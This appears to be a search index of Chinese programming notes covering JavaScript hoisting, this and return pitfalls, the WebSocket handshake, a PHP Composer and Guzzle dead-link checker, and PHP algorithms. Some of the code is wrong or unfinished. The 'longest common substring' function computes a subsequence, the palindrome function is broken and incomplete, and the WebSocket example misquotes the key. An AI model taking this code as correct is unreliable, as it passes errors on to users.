\uff0c\u591a\u4f59\u7684\u53c2\u6570\u4ee5\u6570\u7ec4\u5f62\u5f0f\u4ea4\u7ed9\u53d8\u91cf rest \uff0c\u6240\u4ee5\uff0c\u4e0d\u518d\u9700\u8981 arguments \u6211\u4eec\u5c31\u83b7\u53d6\u4e86\u5168\u90e8\u53c2\u6570\u3002 \u5982\u679c\u4f20\u5165\u7684\u53c2\u6570\u8fde\u6b63\u5e38\u5b9a\u4e49\u7684\u53c2\u6570\u90fd\u6ca1\u586b\u6ee1\uff0c\u4e5f\u4e0d\u8981\u7d27\uff0crest\u53c2\u6570\u4f1a\u63a5\u6536\u4e00\u4e2a\u7a7a\u6570\u7ec4\uff08\u6ce8\u610f\u4e0d\u662f undefined \uff09\u3002","title":"rest\u53c2\u6570"},{"location":"language/javascript/\u51fd\u6570\u7684\u5b9a\u4e49\u548c\u8c03\u7528/#return","text":"1 2 3 4 5 function foo () { return { name : 'foo' }; } foo (); // { name: 'foo' } \u5982\u679c\u628areturn\u8bed\u53e5\u62c6\u6210\u4e24\u884c\uff1a 1 2 3 4 5 6 function foo () { return { name : 'foo' }; } foo (); // undefined \u8981\u5c0f\u5fc3\u4e86 \uff0c\u7531\u4e8eJavaScript\u5f15\u64ce\u5728\u884c\u672b\u81ea\u52a8\u6dfb\u52a0\u5206\u53f7\u7684\u673a\u5236\uff0c\u4e0a\u9762\u7684\u4ee3\u7801\u5b9e\u9645\u4e0a\u53d8\u6210\u4e86\uff1a 1 2 3 4 function foo () { return ; // \u81ea\u52a8\u6dfb\u52a0\u4e86\u5206\u53f7\uff0c\u76f8\u5f53\u4e8ereturn undefined; { name : 'foo' }; // \u8fd9\u884c\u8bed\u53e5\u5df2\u7ecf\u6ca1\u6cd5\u6267\u884c\u5230\u4e86 } \u6240\u4ee5\u6b63\u786e\u7684\u591a\u884c\u5199\u6cd5\u662f\uff1a 1 2 3 4 5 function foo () { return { // \u8fd9\u91cc\u4e0d\u4f1a\u81ea\u52a8\u52a0\u5206\u53f7\uff0c\u56e0\u4e3a{\u8868\u793a\u8bed\u53e5\u5c1a\u672a\u7ed3\u675f name : 'foo' }; }","title":"return \u8bed\u53e5"},{"location":"language/javascript/\u7406\u89e3js\u7684this\u5173\u952e\u5b57/","text":"\u7406\u89e3js\u7684this\u5173\u952e\u5b57 \u00b6 \u8bef\u89e3 \u00b6 this\u5e76\u4e0d\u6307\u5411\u81ea\u8eab \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 function foo ( num ){ console . log ( \"foo:\" + num ); this . count ++ ; } foo . count = 0 ; var i ; for ( i = 0 ; i < 10 ; i ++ ){ if ( i > 5 ){ foo ( i ); } } console . log ( foo . count ); this\u4e5f\u4e0d\u6307\u5411\u51fd\u6570\u7684\u4f5c\u7528\u57df \u00b6 1 2 3 4 5 6 7 8 9 10 function foo (){ var a = 2 ; this . bar (); } function bar (){ console . log ( this . a ); } foo ();","title":"\u7406\u89e3js\u7684this\u5173\u952e\u5b57"},{"location":"language/javascript/\u7406\u89e3js\u7684this\u5173\u952e\u5b57/#jsthis","text":"","title":"\u7406\u89e3js\u7684this\u5173\u952e\u5b57"},{"location":"language/javascript/\u7406\u89e3js\u7684this\u5173\u952e\u5b57/#_1","text":"","title":"\u8bef\u89e3"},{"location":"language/javascript/\u7406\u89e3js\u7684this\u5173\u952e\u5b57/#this","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 function foo ( num ){ console . log ( \"foo:\" + num ); this . count ++ ; } foo . count = 0 ; var i ; for ( i = 0 ; i < 10 ; i ++ ){ if ( i > 5 ){ foo ( i ); } } console . log ( foo . count );","title":"this\u5e76\u4e0d\u6307\u5411\u81ea\u8eab"},{"location":"language/javascript/\u7406\u89e3js\u7684this\u5173\u952e\u5b57/#this_1","text":"1 2 3 4 5 6 7 8 9 10 function foo (){ var a = 2 ; this . bar (); } function bar (){ console . log ( this . a ); } foo ();","title":"this\u4e5f\u4e0d\u6307\u5411\u51fd\u6570\u7684\u4f5c\u7528\u57df"},{"location":"language/javascript/\u7406\u89e3\u4f5c\u7528\u57df/","text":"\u7406\u89e3JavaScript\u7684\u4f5c\u7528\u57df \u00b6 \u58f0\u660e\u63d0\u5347 \u00b6 \u8fd9\u6bb5\u4ee3\u7801\u5f88\u7ecf\u5178\u4e86 1 2 3 a = 2 ; var a ; console . log ( a ); \u5f88\u591a\u4eba\u89c9\u5f97\u8f93\u51fa\u5e94\u8be5\u662f undefined \u4f46\u662f\u5b9e\u9645\u4e0a\u662f2 \u90a3\u770b\u8fd9\u4e2a\uff1a 1 \u540c\u6837\u662f\u8f93\u51fa undefined \u800c\u4e0d\u662f\u62a5\u9519 \u5148\u6709\u9e21\u8fd8\u662f\u5148\u6709\u86cb \u00b6 \u7ed3\u8bba\uff1a \u5148\u6709\u86cb(\u58f0\u660e)\u540e\u6709\u9e21(\u8d4b\u503c) \u6240\u6709\u7684\u58f0\u660e\u90fd\u4f1a\u63d0\u5347\u5230\u6700\u524d\u9762\u6267\u884c\uff0c\u4e5f\u5c31\u662f\u90a3\u4e2a var a \u4e4b\u540e\u518d\u8d4b\u503c \u66f4\u591a\u7684\u6817\u5b50 \u00b6 \u51fd\u6570\u4e2d\u5982\u4f55\u8868\u73b0 1 2 3 4 5 foo (); function foo () { console . log ( a ); //undefined var a = 2 ; } \u8fd9\u6bb5\u4ee3\u7801\u7684\u6267\u884c\u987a\u5e8f\uff1a 1 \u7136\u800c\u51fd\u6570\u8868\u8fbe\u5f0f\u5374\u4e0d\u4f1a\u63d0\u5347 1 2 3 4 foo (); // \u6b64\u5904\u4f1a\u5bfc\u81f4TypeError \u56e0\u4e3afoo\u53ea\u662f\u88ab\u58f0\u660e\u4e86\u4f46\u662f\u5e76\u4e0d\u77e5\u9053\u662f\u4e00\u4e2a\u51fd\u6570 var foo = function () { console . log ( 1 ); } \u51fd\u6570\u4f18\u5148 \u00b6 1 2 3 4 5 6 7 8 foo (); function foo () { console . log ( 1 ); } var foo = function () { console . log ( 2 ); } \u8fd9\u6bb5\u4ee3\u7801\u7684\u7ed3\u679c\u662f1\u800c\u4e0d\u662f2\uff0c\u6267\u884c\u987a\u5e8f\u5982\u4e0b\uff1a 1 \u6b64\u65f6\u5982\u679c\u540e\u9762\u8fd8\u6709\u4e00\u4e2a\u540c\u540d\u7684foo\u51fd\u6570\u5219\u4f1a\u4f18\u5148\u63d0\u5347\u6700\u540e\u7684\u90a3\u4e2a\u540c\u540d\u51fd\u6570 1 2 3 4 5 6 7 8 9 10 11 foo (); function foo () { console . log ( 1 ); } var foo = function () { console . log ( 2 ); } function foo () { console . log ( 3 ); } \u6b64\u65f6\u4f1a\u8f93\u51fa3 \u540c\u6837\u6709\u8da3\u7684\u662f\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 foo (); var a = true ; if ( a ){ function foo () { console . log ( \"a == true\" ); } } else { function foo () { console . log ( \"a == false\" ); } } \u5982\u679c\u6309\u7167\u4e4b\u524d\u7684\u7406\u89e3\uff0c\u5176\u5b9e\u8fd9\u91cc\u8f93\u51fa\u7684\u5e94\u8be5\u662f a == false \u4f46\u662f\u8c03\u8bd5\u7684\u65f6\u5019node\u62a5\u9519\u4e86 \u53c2\u8003 \u00b6 \u6df1\u5165\u7406\u89e3JavaScript\u58f0\u660e\u63d0\u5347\uff0c\u4f5c\u7528\u57df\u548cthis\u5173\u952e\u5b57","title":"\u7406\u89e3JavaScript\u7684\u4f5c\u7528\u57df"},{"location":"language/javascript/\u7406\u89e3\u4f5c\u7528\u57df/#javascript","text":"","title":"\u7406\u89e3JavaScript\u7684\u4f5c\u7528\u57df"},{"location":"language/javascript/\u7406\u89e3\u4f5c\u7528\u57df/#_1","text":"\u8fd9\u6bb5\u4ee3\u7801\u5f88\u7ecf\u5178\u4e86 1 2 3 a = 2 ; var a ; console . log ( a ); \u5f88\u591a\u4eba\u89c9\u5f97\u8f93\u51fa\u5e94\u8be5\u662f undefined \u4f46\u662f\u5b9e\u9645\u4e0a\u662f2 \u90a3\u770b\u8fd9\u4e2a\uff1a 1 \u540c\u6837\u662f\u8f93\u51fa undefined \u800c\u4e0d\u662f\u62a5\u9519","title":"\u58f0\u660e\u63d0\u5347"},{"location":"language/javascript/\u7406\u89e3\u4f5c\u7528\u57df/#_2","text":"\u7ed3\u8bba\uff1a \u5148\u6709\u86cb(\u58f0\u660e)\u540e\u6709\u9e21(\u8d4b\u503c) \u6240\u6709\u7684\u58f0\u660e\u90fd\u4f1a\u63d0\u5347\u5230\u6700\u524d\u9762\u6267\u884c\uff0c\u4e5f\u5c31\u662f\u90a3\u4e2a var a \u4e4b\u540e\u518d\u8d4b\u503c","title":"\u5148\u6709\u9e21\u8fd8\u662f\u5148\u6709\u86cb"},{"location":"language/javascript/\u7406\u89e3\u4f5c\u7528\u57df/#_3","text":"\u51fd\u6570\u4e2d\u5982\u4f55\u8868\u73b0 1 2 3 4 5 foo (); function foo () { console . log ( a ); //undefined var a = 2 ; } \u8fd9\u6bb5\u4ee3\u7801\u7684\u6267\u884c\u987a\u5e8f\uff1a 1 \u7136\u800c\u51fd\u6570\u8868\u8fbe\u5f0f\u5374\u4e0d\u4f1a\u63d0\u5347 1 2 3 4 foo (); // \u6b64\u5904\u4f1a\u5bfc\u81f4TypeError \u56e0\u4e3afoo\u53ea\u662f\u88ab\u58f0\u660e\u4e86\u4f46\u662f\u5e76\u4e0d\u77e5\u9053\u662f\u4e00\u4e2a\u51fd\u6570 var foo = function () { console . log ( 1 ); }","title":"\u66f4\u591a\u7684\u6817\u5b50"},{"location":"language/javascript/\u7406\u89e3\u4f5c\u7528\u57df/#_4","text":"1 2 3 4 5 6 7 8 foo (); function foo () { console . log ( 1 ); } var foo = function () { console . log ( 2 ); } \u8fd9\u6bb5\u4ee3\u7801\u7684\u7ed3\u679c\u662f1\u800c\u4e0d\u662f2\uff0c\u6267\u884c\u987a\u5e8f\u5982\u4e0b\uff1a 1 \u6b64\u65f6\u5982\u679c\u540e\u9762\u8fd8\u6709\u4e00\u4e2a\u540c\u540d\u7684foo\u51fd\u6570\u5219\u4f1a\u4f18\u5148\u63d0\u5347\u6700\u540e\u7684\u90a3\u4e2a\u540c\u540d\u51fd\u6570 1 2 3 4 5 6 7 8 9 10 11 foo (); function foo () { console . log ( 1 ); } var foo = function () { console . log ( 2 ); } function foo () { console . log ( 3 ); } \u6b64\u65f6\u4f1a\u8f93\u51fa3 \u540c\u6837\u6709\u8da3\u7684\u662f\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 foo (); var a = true ; if ( a ){ function foo () { console . log ( \"a == true\" ); } } else { function foo () { console . log ( \"a == false\" ); } } \u5982\u679c\u6309\u7167\u4e4b\u524d\u7684\u7406\u89e3\uff0c\u5176\u5b9e\u8fd9\u91cc\u8f93\u51fa\u7684\u5e94\u8be5\u662f a == false \u4f46\u662f\u8c03\u8bd5\u7684\u65f6\u5019node\u62a5\u9519\u4e86","title":"\u51fd\u6570\u4f18\u5148"},{"location":"language/javascript/\u7406\u89e3\u4f5c\u7528\u57df/#_5","text":"\u6df1\u5165\u7406\u89e3JavaScript\u58f0\u660e\u63d0\u5347\uff0c\u4f5c\u7528\u57df\u548cthis\u5173\u952e\u5b57","title":"\u53c2\u8003"},{"location":"language/javascript/node/","text":"","title":"Index"},{"location":"language/javascript/node/websocket/","text":"websocket\u534f\u8bae \u00b6 \u5ba2\u6237\u7aef\u4e3b\u52a8\u53d1\u9001\u7684\u6570\u636e\u5305\u683c\u5f0f\uff1a 1 2 3 4 5 6 7 8 GET /chat HTTP/1.1 Host: server.example.com Upgrade: websocket Connection: Upgrade Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ== Origin: http://example.com Sec-WebSocket-Protocol: chat, superchat Sec-WebSocket-Version: 13 \u670d\u52a1\u7aef\u8fd4\u56de\uff1a 1 2 3 4 5 HTTP/1.1 101 Switching Protocols Upgrade: websocket Connection: Upgrade Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo= Sec-WebSocket-Protocol: chat \u670d\u52a1\u7aef\u8fd4\u56de\u4e86 Sec-WebSocket-Accept \u8fd9\u4e2a\u5e94\u7b54\uff0c\u8fd9\u4e2a\u5e94\u7b54\u5185\u5bb9\u662f\u901a\u8fc7\u4e00\u5b9a\u7684\u65b9\u5f0f\u751f\u6210\u7684\u3002\u751f\u6210\u7b97\u6cd5\u662f\uff1a 1 2 mask = \"258EAFA5-E914-47DA-95CA-C5AB0DC85B11\"; // \u8fd9\u662f\u7b97\u6cd5\u4e2d\u8981\u7528\u5230\u7684\u56fa\u5b9a\u5b57\u7b26\u4e32 accept = base64( sha1( key + mask ) ); key \u548c mask \u4e32\u63a5\u4e4b\u540e\u7ecf\u8fc7 SHA-1 \u5904\u7406\uff0c\u5904\u7406\u540e\u7684\u6570\u636e\u518d\u7ecf\u8fc7\u4e00\u6b21 Base64 \u52a0\u5bc6\u3002\u5206\u89e3\u52a8\u4f5c\uff1a 1 2 3 4 5 6 7 1. t = \"GhlIHNhbXBsZSBub25jZQ==\" + \"258EAFA5-E914-47DA-95CA-C5AB0DC85B11\" -> \"GhlIHNhbXBsZSBub25jZQ==258EAFA5-E914-47DA-95CA-C5AB0DC85B11\" 2. s = sha1(t) -> 0xb3 0x7a 0x4f 0x2c 0xc0 0x62 0x4f 0x16 0x90 0xf6 0x46 0x06 0xcf 0x38 0x59 0x45 0xb2 0xbe 0xc4 0xea 3. base64(s) -> \"s3pPLMBiTxaQ9kYGzzhZRbK+xOo=\" \u53c2\u8003 \u00b6 \u7ec6\u8bf4websocket","title":"websocket\u534f\u8bae"},{"location":"language/javascript/node/websocket/#websocket","text":"\u5ba2\u6237\u7aef\u4e3b\u52a8\u53d1\u9001\u7684\u6570\u636e\u5305\u683c\u5f0f\uff1a 1 2 3 4 5 6 7 8 GET /chat HTTP/1.1 Host: server.example.com Upgrade: websocket Connection: Upgrade Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ== Origin: http://example.com Sec-WebSocket-Protocol: chat, superchat Sec-WebSocket-Version: 13 \u670d\u52a1\u7aef\u8fd4\u56de\uff1a 1 2 3 4 5 HTTP/1.1 101 Switching Protocols Upgrade: websocket Connection: Upgrade Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo= Sec-WebSocket-Protocol: chat \u670d\u52a1\u7aef\u8fd4\u56de\u4e86 Sec-WebSocket-Accept \u8fd9\u4e2a\u5e94\u7b54\uff0c\u8fd9\u4e2a\u5e94\u7b54\u5185\u5bb9\u662f\u901a\u8fc7\u4e00\u5b9a\u7684\u65b9\u5f0f\u751f\u6210\u7684\u3002\u751f\u6210\u7b97\u6cd5\u662f\uff1a 1 2 mask = \"258EAFA5-E914-47DA-95CA-C5AB0DC85B11\"; // \u8fd9\u662f\u7b97\u6cd5\u4e2d\u8981\u7528\u5230\u7684\u56fa\u5b9a\u5b57\u7b26\u4e32 accept = base64( sha1( key + mask ) ); key \u548c mask \u4e32\u63a5\u4e4b\u540e\u7ecf\u8fc7 SHA-1 \u5904\u7406\uff0c\u5904\u7406\u540e\u7684\u6570\u636e\u518d\u7ecf\u8fc7\u4e00\u6b21 Base64 \u52a0\u5bc6\u3002\u5206\u89e3\u52a8\u4f5c\uff1a 1 2 3 4 5 6 7 1. t = \"GhlIHNhbXBsZSBub25jZQ==\" + \"258EAFA5-E914-47DA-95CA-C5AB0DC85B11\" -> \"GhlIHNhbXBsZSBub25jZQ==258EAFA5-E914-47DA-95CA-C5AB0DC85B11\" 2. s = sha1(t) -> 0xb3 0x7a 0x4f 0x2c 0xc0 0x62 0x4f 0x16 0x90 0xf6 0x46 0x06 0xcf 0x38 0x59 0x45 0xb2 0xbe 0xc4 0xea 3. base64(s) -> \"s3pPLMBiTxaQ9kYGzzhZRbK+xOo=\"","title":"websocket\u534f\u8bae"},{"location":"language/javascript/node/websocket/#_1","text":"\u7ec6\u8bf4websocket","title":"\u53c2\u8003"},{"location":"language/php/","text":"php \u00b6","title":"php"},{"location":"language/php/#php","text":"","title":"php"},{"location":"language/php/Laravel/","text":"Laravel\u6846\u67b6 \u00b6 \u7ec4\u4ef6 \u00b6 \u6211\u4eec\u5728 Packagist \u4e2d\u67e5\u627ePHP\u7ec4\u4ef6\uff0c\u8fd9\u4e2a\u7f51\u7ad9\u7528\u4e8e\u6536\u96c6PHP\u7ec4\u4ef6 \u4f7f\u7528http\u7ec4\u4ef6\u6536\u53d1http\u6d88\u606f\uff0c\u641c\u7d22\u5f97\u5230 Guzzle composer \u00b6 Packagist\u662f\u67e5\u627ePHP\u7ec4\u4ef6\u7684\u793e\u533a\uff0cComposer\u5219\u662f\u5b89\u88c5PHP\u7ec4\u4ef6\u7684\u5de5\u5177\u3002Composer\u662fPHP\u7684\u4f9d\u8d56\u7ba1\u7406\u5668 \u4fee\u6539 composer \u7684\u955c\u50cf\u6e90 1 composer config -g repo.packagist composer https://packagist.phpcomposer.com pakgist\u955c\u50cf \u4f7f\u7528\u7ec4\u4ef6\u548ccomposer\u5f00\u53d1\u4e00\u4e2a\u793a\u4f8b\u9879\u76ee \u00b6 \u626b\u63cf\u4e00\u4e2aCSV\u6587\u4ef6\u4e2d\u7684URL\uff0c\u627e\u51fa\u6b7b\u94fe\uff0c\u8be5\u5e94\u7528\u4f1a\u5411\u6bcf\u4e2aURL\u53d1HTTP\u8bf7\u6c42\uff0c\u5982\u679c\u8fd4\u56de\u7684HTTP\u72b6\u6001\u7801\u5927\u4e8e\u7b49\u4e8e400\uff0c\u5c31\u628a\u8fd9\u4e2a\u6b7b\u94fe\u53d1\u7ed9\u6807\u51c6\u8f93\u51fa \u9700\u8981\u54ea\u4e9b\u7ec4\u4ef6\uff1f \u663e\u7136\u662f\u4e00\u4e2aCSV\uff0c\u4e00\u4e2a\u53ef\u4ee5\u53d1\u9001http\u8bf7\u6c42\u7684\u7ec4\u4ef6 \u641c\u7d22\u627e\u5230\u4e4b\u540e\u5c31\u53ef\u4ee5\u76f4\u63a5\u5b89\u88c5\u4e86 \u5b89\u88c5\u7ec4\u4ef6 \u00b6 1 2 composer require guzzlehttp/guzzle composer require league/csv \u6b64\u65f6\u7684\u76ee\u5f55\u7ed3\u6784\uff1a 1 \u7f16\u5199\u6587\u4ef6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 <?php //\u4f7f\u7528composer\u81ea\u52a8\u52a0\u8f7d\u5668 require 'vendor/autoload.php' ; //\u5b9e\u4f8bGuzzle Http\u5ba2\u6237\u7aef $client = new GuzzleHttp\\Client (); //\u6253\u5f00\u5e76\u8fed\u4ee3\u5904\u7406CSV $csv = League\\Csv\\Reader :: createFromPath ( $argv [ 1 ]); foreach ( $csv as $csvRow ) { try { //\u53d1\u9001HTTP GET\u8bf7\u6c42 $httpResponse = $client -> get ( $csvRow [ 0 ]); //\u68c0\u67e5HTTP\u54cd\u5e94\u7684\u72b6\u6001\u7801 if ( $httpResponse -> getStatusCode () >= 400 ) { throw new Exception (); } } catch ( Exception $e ) { //\u628a\u6b7b\u94fe\u53d1\u7ed9\u6807\u51c6\u8f93\u51fa echo $csvRow [ 0 ] . PHP_EOL ; } } \u9700\u8981\u6ce8\u610f\u7684\u662f\u6587\u4ef6\u662f\u653e\u5728\u6839\u76ee\u5f55\u53bb\u6267\u884c\u7684 \u53c2\u8003 \u00b6 \u5b9e\u8df5\u7cfb\u5217 \u7ec4\u4ef6\uff0c\u6846\u67b6, composer","title":"Laravel\u6846\u67b6"},{"location":"language/php/Laravel/#laravel","text":"","title":"Laravel\u6846\u67b6"},{"location":"language/php/Laravel/#_1","text":"\u6211\u4eec\u5728 Packagist \u4e2d\u67e5\u627ePHP\u7ec4\u4ef6\uff0c\u8fd9\u4e2a\u7f51\u7ad9\u7528\u4e8e\u6536\u96c6PHP\u7ec4\u4ef6 \u4f7f\u7528http\u7ec4\u4ef6\u6536\u53d1http\u6d88\u606f\uff0c\u641c\u7d22\u5f97\u5230 Guzzle","title":"\u7ec4\u4ef6"},{"location":"language/php/Laravel/#composer","text":"Packagist\u662f\u67e5\u627ePHP\u7ec4\u4ef6\u7684\u793e\u533a\uff0cComposer\u5219\u662f\u5b89\u88c5PHP\u7ec4\u4ef6\u7684\u5de5\u5177\u3002Composer\u662fPHP\u7684\u4f9d\u8d56\u7ba1\u7406\u5668 \u4fee\u6539 composer \u7684\u955c\u50cf\u6e90 1 composer config -g repo.packagist composer https://packagist.phpcomposer.com pakgist\u955c\u50cf","title":"composer"},{"location":"language/php/Laravel/#composer_1","text":"\u626b\u63cf\u4e00\u4e2aCSV\u6587\u4ef6\u4e2d\u7684URL\uff0c\u627e\u51fa\u6b7b\u94fe\uff0c\u8be5\u5e94\u7528\u4f1a\u5411\u6bcf\u4e2aURL\u53d1HTTP\u8bf7\u6c42\uff0c\u5982\u679c\u8fd4\u56de\u7684HTTP\u72b6\u6001\u7801\u5927\u4e8e\u7b49\u4e8e400\uff0c\u5c31\u628a\u8fd9\u4e2a\u6b7b\u94fe\u53d1\u7ed9\u6807\u51c6\u8f93\u51fa \u9700\u8981\u54ea\u4e9b\u7ec4\u4ef6\uff1f \u663e\u7136\u662f\u4e00\u4e2aCSV\uff0c\u4e00\u4e2a\u53ef\u4ee5\u53d1\u9001http\u8bf7\u6c42\u7684\u7ec4\u4ef6 \u641c\u7d22\u627e\u5230\u4e4b\u540e\u5c31\u53ef\u4ee5\u76f4\u63a5\u5b89\u88c5\u4e86","title":"\u4f7f\u7528\u7ec4\u4ef6\u548ccomposer\u5f00\u53d1\u4e00\u4e2a\u793a\u4f8b\u9879\u76ee"},{"location":"language/php/Laravel/#_2","text":"1 2 composer require guzzlehttp/guzzle composer require league/csv \u6b64\u65f6\u7684\u76ee\u5f55\u7ed3\u6784\uff1a 1 \u7f16\u5199\u6587\u4ef6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 <?php //\u4f7f\u7528composer\u81ea\u52a8\u52a0\u8f7d\u5668 require 'vendor/autoload.php' ; //\u5b9e\u4f8bGuzzle Http\u5ba2\u6237\u7aef $client = new GuzzleHttp\\Client (); //\u6253\u5f00\u5e76\u8fed\u4ee3\u5904\u7406CSV $csv = League\\Csv\\Reader :: createFromPath ( $argv [ 1 ]); foreach ( $csv as $csvRow ) { try { //\u53d1\u9001HTTP GET\u8bf7\u6c42 $httpResponse = $client -> get ( $csvRow [ 0 ]); //\u68c0\u67e5HTTP\u54cd\u5e94\u7684\u72b6\u6001\u7801 if ( $httpResponse -> getStatusCode () >= 400 ) { throw new Exception (); } } catch ( Exception $e ) { //\u628a\u6b7b\u94fe\u53d1\u7ed9\u6807\u51c6\u8f93\u51fa echo $csvRow [ 0 ] . PHP_EOL ; } } \u9700\u8981\u6ce8\u610f\u7684\u662f\u6587\u4ef6\u662f\u653e\u5728\u6839\u76ee\u5f55\u53bb\u6267\u884c\u7684","title":"\u5b89\u88c5\u7ec4\u4ef6"},{"location":"language/php/Laravel/#_3","text":"\u5b9e\u8df5\u7cfb\u5217 \u7ec4\u4ef6\uff0c\u6846\u67b6, composer","title":"\u53c2\u8003"},{"location":"language/php/algorithm/","text":"\u5e38\u7528\u7b97\u6cd5 \u00b6 \u5192\u6ce1\u6392\u5e8f \u00b6 1 2 3 4 5 6 7 8 9 10 11 $n=count($arr); for($i=0;$i<$n-1;$i++){ for($j=$i+1;$j<$n;$j++) { if($arr[$j]<$arr[$i]) { $temp=$arr[$i]; $arr[$i]=$arr[$j]; $arr[$j]=$temp; } } } return $arr; longestCommonSubstring\u6700\u957f\u516c\u5171\u5b50\u5b57\u7b26\u4e32 \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 <?php function longestCommonSubstring ( $a , $b ){ //\u8fd8\u662f\u540c\u6837\u7684\u95ee\u9898\uff0cPHP\u5982\u4f55\u89e3\u51b3\u4e8c\u7ef4\u6570\u7ec4\u7684\u95ee\u9898 $len_a = strlen ( $a ); $len_b = strlen ( $b ); //\u521d\u59cb\u5316\u4e00\u4e2a\u4e8c\u7ef4\u6570\u7ec4 ---> php\u4e2d\u5982\u4f55\u521d\u59cb\u5316\u4e8c\u7ef4\u6570\u7ec4\u627e\u4e86\u597d\u4e45 $dp_a = array_fill ( 0 , $len_b + 1 , 0 ); $dp = array_fill ( 0 , $len_a + 1 , $dp_a ); //\u52a8\u6001\u89c4\u5212\u7684\u601d\u8def\uff0cdp[i][j]\u4ee3\u8868\u4e00\u4e2a\u72b6\u6001\uff0c\u53ef\u4ee5\u7531\u4e4b\u524d\u7684\u72b6\u6001\u6765\u5f97\u5230 for ( $i = 0 ; $i < $len_a ; $i ++ ){ for ( $j = 0 ; $j < $len_b ; $j ++ ) { //\u5f00\u59cb\u72b6\u6001\u8f6c\u79fb if ( substr ( $a , $i , 1 ) === substr ( $b , $j , 1 )) { // $dp[$i]= dp[$i - 1]+ 1; $dp [ $i + 1 ][ $j + 1 ] = $dp [ $i ][ $j ] + 1 ; } else { $dp [ $i + 1 ][ $j + 1 ] = max ( $dp [ $i ][ $j + 1 ], $dp [ $i + 1 ][ $j ]); } } } return $dp [ $len_a ][ $len_b ]; // return ans; } longestPalindrome \u6700\u957f\u56de\u6587\u5b50\u5b57\u7b26\u4e32 \u00b6 \u4f7f\u7528\u52a8\u6001\u89c4\u5212\u7684\u601d\u8def\uff0c\u8fd8\u6ca1\u6709\u5b8c\u5168\u5b9e\u73b0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 <?php /** * \u6700\u957f\u56de\u6587\u5b50\u5b57\u7b26\u4e32 * @param $s string * @return string */ function longestPalindrome ( $s ){ //\u601d\u8003\u5982\u4f55\u4f7f\u7528\u52a8\u6001\u89c4\u5212\u7684\u65b9\u6cd5 //\u5982\u679c$s\u662f\u56de\u6587\u4e32\uff0c\u90a3\u4e48\u9996\u5c3e\u90fd\u4e22\u6389\u4e00\u4e2a\u4e5f\u662f\u56de\u6587\u4e32 $a = \"babad\" //P(i,j) = (P(i+1,j-1) and Si == Sj) $len = strlen ( $s ); if ( $len < 1 ){ return s ; } //\u4e0d\u77e5\u9053php\u4e2d\u600e\u4e48\u521d\u59cb\u5316\u6307\u5b9a\u957f\u5ea6\u7684\u7a7a\u6570\u7ec4 $dp = [[]]; $longest_l = 1 ; $res = substr ( $s , 0 , 1 ); for ( $r = 1 ; $r < $len ; $r ++ ){ for ( $l = 0 ; $l < $r ; $l ++ ){ // if(substr_compare($s,$s,)) if ( substr ( $s , $l , 1 ) === substr ( $s , $r , 1 ) && r - l <= 2 || $dp [ $l + 1 ][ $r - 1 ]){ $dp [ $l ][ $r ] == true ; $longest_l = max ( $r - $l + 1 , $longest_l ); } } } } \u53c2\u8003 \u00b6 https://segmentfault.com/a/1190000009067353","title":"\u5e38\u7528\u7b97\u6cd5"},{"location":"language/php/algorithm/#_1","text":"","title":"\u5e38\u7528\u7b97\u6cd5"},{"location":"language/php/algorithm/#_2","text":"1 2 3 4 5 6 7 8 9 10 11 $n=count($arr); for($i=0;$i<$n-1;$i++){ for($j=$i+1;$j<$n;$j++) { if($arr[$j]<$arr[$i]) { $temp=$arr[$i]; $arr[$i]=$arr[$j]; $arr[$j]=$temp; } } } return $arr;","title":"\u5192\u6ce1\u6392\u5e8f"},{"location":"language/php/algorithm/#longestcommonsubstring","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 <?php function longestCommonSubstring ( $a , $b ){ //\u8fd8\u662f\u540c\u6837\u7684\u95ee\u9898\uff0cPHP\u5982\u4f55\u89e3\u51b3\u4e8c\u7ef4\u6570\u7ec4\u7684\u95ee\u9898 $len_a = strlen ( $a ); $len_b = strlen ( $b ); //\u521d\u59cb\u5316\u4e00\u4e2a\u4e8c\u7ef4\u6570\u7ec4 ---> php\u4e2d\u5982\u4f55\u521d\u59cb\u5316\u4e8c\u7ef4\u6570\u7ec4\u627e\u4e86\u597d\u4e45 $dp_a = array_fill ( 0 , $len_b + 1 , 0 ); $dp = array_fill ( 0 , $len_a + 1 , $dp_a ); //\u52a8\u6001\u89c4\u5212\u7684\u601d\u8def\uff0cdp[i][j]\u4ee3\u8868\u4e00\u4e2a\u72b6\u6001\uff0c\u53ef\u4ee5\u7531\u4e4b\u524d\u7684\u72b6\u6001\u6765\u5f97\u5230 for ( $i = 0 ; $i < $len_a ; $i ++ ){ for ( $j = 0 ; $j < $len_b ; $j ++ ) { //\u5f00\u59cb\u72b6\u6001\u8f6c\u79fb if ( substr ( $a , $i , 1 ) === substr ( $b , $j , 1 )) { // $dp[$i]= dp[$i - 1]+ 1; $dp [ $i + 1 ][ $j + 1 ] = $dp [ $i ][ $j ] + 1 ; } else { $dp [ $i + 1 ][ $j + 1 ] = max ( $dp [ $i ][ $j + 1 ], $dp [ $i + 1 ][ $j ]); } } } return $dp [ $len_a ][ $len_b ]; // return ans; }","title":"longestCommonSubstring\u6700\u957f\u516c\u5171\u5b50\u5b57\u7b26\u4e32"},{"location":"language/php/algorithm/#longestpalindrome","text":"\u4f7f\u7528\u52a8\u6001\u89c4\u5212\u7684\u601d\u8def\uff0c\u8fd8\u6ca1\u6709\u5b8c\u5168\u5b9e\u73b0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 <?php /** * \u6700\u957f\u56de\u6587\u5b50\u5b57\u7b26\u4e32 * @param $s string * @return string */ function longestPalindrome ( $s ){ 